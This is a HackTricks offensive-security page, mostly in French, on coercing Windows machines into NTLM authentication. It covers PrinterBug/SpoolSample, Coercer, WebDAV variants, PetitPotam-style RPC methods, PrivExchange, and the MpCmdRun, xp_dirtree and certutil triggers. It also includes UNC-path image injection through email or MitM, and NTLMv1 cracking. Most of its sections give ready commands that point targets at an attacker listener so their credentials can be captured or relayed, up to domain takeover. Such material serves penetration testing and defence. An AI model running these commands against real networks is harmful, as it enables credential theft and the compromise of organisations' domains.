# Force NTLM Authentification privilégiée

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification distante** codée en C# en utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Spooler Service Abuse

Si le service _**Print Spooler**_ est **activé,** vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du Domain Controller une **mise à jour** sur les nouveaux travaux d'impression et simplement lui dire **d'envoyer la notification à un autre système**.\
Notez que lorsque l'imprimante envoie la notification à un système arbitraire, elle doit **s'authentifier auprès de** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Print Spooler**_ s'authentifie auprès d'un système arbitraire, et le service utilisera **le compte machine** dans cette authentification.

Sous le capot, le primitive classique **PrinterBug** abuse de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** via **`\\PIPE\\spoolss`**. L'attaquant ouvre d'abord un handle d'imprimante/serveur puis fournit un faux nom de client dans `pszLocalMachine`, afin que le spooler cible crée un canal de notification **vers l'hôte contrôlé par l'attaquant**. C'est pourquoi l'effet est une **coercition d'authentification sortante** plutôt qu'une exécution de code directe.\
Si vous cherchez du **RCE/LPE** dans le spooler lui-même, consultez [PrintNightmare](printnightmare.md). Cette page se concentre sur la **coercition et le relay**.

### Trouver les serveurs Windows sur le domaine

En utilisant PowerShell, obtenez une liste des machines Windows. Les serveurs sont généralement prioritaires, donc concentrons-nous là-dessus :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Trouver les services Spooler à l’écoute

En utilisant une version légèrement modifiée du [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), vérifiez si le service Spooler est à l’écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser `rpcdump.py` sous Linux et rechercher le protocole **MS-RPRN** :
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ou testez rapidement des hôtes depuis Linux avec **NetExec/CrackMapExec** :
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si vous voulez **énumérer les surfaces de coercition** au lieu de simplement vérifier si le point de terminaison du spooler existe, utilisez le **mode de scan Coercer** :
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
C’est utile car voir l’endpoint dans EPM vous indique seulement que l’interface print RPC est enregistrée. Cela ne garantit **pas** que chaque méthode de coercion soit accessible avec vos privilèges actuels ni que l’hôte émette un flux d’authentification exploitable.

### Demander au service de s’authentifier auprès d’un hôte arbitraire

Vous pouvez compiler [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sous Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Avec **Coercer**, vous pouvez cibler directement les interfaces du spooler et éviter de deviner quelle méthode RPC est exposée :
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forcer HTTP au lieu de SMB avec WebClient

Le PrinterBug classique provoque généralement une authentification **SMB** vers `\\attacker\share`, ce qui reste utile pour **capture**, **relay vers des cibles HTTP** ou **relay là où SMB signing est absent**.\
Cependant, dans les environnements modernes, le relay de **SMB vers SMB** est souvent bloqué par **SMB signing**, donc les opérateurs préfèrent souvent forcer une authentification **HTTP/WebDAV** à la place.

Si la cible a le service **WebClient** en cours d’exécution, l’écouteur peut être spécifié sous une forme qui fait utiliser à Windows **WebDAV over HTTP** :
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ceci est particulièrement utile lorsqu’on le chaîne avec **`ntlmrelayx --adcs`** ou d’autres cibles de relay HTTP, car cela évite de dépendre de la relayability SMB sur la connexion coercée. L’avertissement important est que **WebClient doit être en cours d’exécution** sur la victime pour que la variante HTTP/WebDAV fonctionne.

### Combining avec Unconstrained Delegation

Si un attaquant a déjà compromis un ordinateur avec [Unconstrained Delegation](unconstrained-delegation.md), l’attaquant pourrait **faire en sorte que l’imprimante s’authentifie auprès de cet ordinateur**. En raison de l’unconstrained delegation, le **TGT** du **compte machine de l’imprimante** sera **enregistré dans** la **mémoire** de l’ordinateur avec unconstrained delegation. Comme l’attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l’abuser ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

L’attaque `PrivExchange` est la conséquence d’une faille découverte dans la fonctionnalité **Exchange Server `PushSubscription`**. Cette fonctionnalité permet de forcer le serveur Exchange à authentifier n’importe quel hôte fourni par le client en HTTP, par tout utilisateur du domaine disposant d’une boîte mail.

Par défaut, le **service Exchange s’exécute en tant que SYSTEM** et reçoit des privilèges excessifs (en particulier, il a des **privilèges WriteDacl sur le domaine avant le Cumulative Update 2019**). Cette faille peut être exploitée pour permettre le **relay d’informations vers LDAP puis l’extraction de la base NTDS du domaine**. Dans les cas où le relay vers LDAP n’est pas possible, cette faille peut toujours être utilisée pour relayer et authentifier vers d’autres hôtes au sein du domaine. L’exploitation réussie de cette attaque accorde un accès immédiat au Domain Admin avec n’importe quel compte utilisateur du domaine authentifié.

## Inside Windows

Si vous êtes déjà à l’intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d’utiliser certutil.exe lolbin (binary signé par Microsoft) pour forcer l’authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Via email

Si vous connaissez l’**adresse email** de l’utilisateur qui se connecte sur une machine que vous voulez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu’il l’ouvre, il essaiera de s’authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML dans une page qu’il visualisera, vous pourriez essayer d’injecter une image comme la suivante dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Autres façons de forcer et de phisher l'authentification NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_

## Références
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
